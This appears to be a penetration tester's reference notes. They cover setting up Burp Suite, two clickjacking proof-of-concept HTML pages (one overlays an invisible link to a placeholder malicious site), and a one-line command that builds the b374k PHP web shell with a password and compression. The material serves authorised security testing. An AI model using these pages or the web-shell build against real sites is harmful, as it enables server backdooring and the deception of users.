Burp "Quick Start" guide
--------
I did a video demo of how to get up and going with Burp quickly in [episode #230](https://7ms.us/7ms-230-pentesting-owasp-juice-shop-part-1/) of the 7 Minute Security podcast.  It includes things like:

* Getting Burp installed
* Installing the SSL cert
* Installing FoxyProxy and proxying traffic through Burp
* Setting up a quick shell script to start Burp from the command line:
  * `java -Xmx2g -jar burpsuite.jar`

* Installing helpful extensions from the BApp store :

 * CO2
 * CSRF Scanner
 * JS Beautifier
 * Retire.js
 * SQLiPy
 * Wsdler

Clickjacking sample

# Clickjacking

Here's a good page about [clickjacking](https://www.owasp.org/index.php/Testing_for_Clickjacking_(OTG-CLIENT-009)), and if you need to whip together a quick PoC for a client, I find this one works pretty well:

---

````
<html>
   <head>
     <title>Clickjack test page</title>
   </head>
   <body>
     <p>Website is vulnerable to clickjacking!</p>
     <iframe src="http://www.target.site" width="500" height="500"></iframe>
   </body>
</html>
````

As does this one:

````
<html>
<title>This is your totally safe corporate site...OR IS IT?!?!?!?!?!?</title>
  <head>
    <style>
      body {
        position: relative;
        margin: 0;
      }

      iframe, div, a {
        border: none;
        position: absolute;
        width: 100%;
        height: 100%;
      }

      div {
        z-index: 100;
      }

      a {
        display: block;
      }
    </style>
  </head>
  <body>
    <iframe src="https://name-of-site-without-sameorigin-set-correctly.com">
    </iframe>
    <div>
      <a href=" http://www.some-really-really-bad-site.com "></a>
    </div>
  </body>
</html>

Web Shells
--------

## B374K
One of my fav Web shells is [b374k](https://github.com/b374k/b374k), and as a quick ref, once you clone it from github, you can get a shell compiled pretty quick with:

`php -f index.php -- -o myShell.php -p MyPasswordGoesHere -s -b -z gzcompress -c 9`
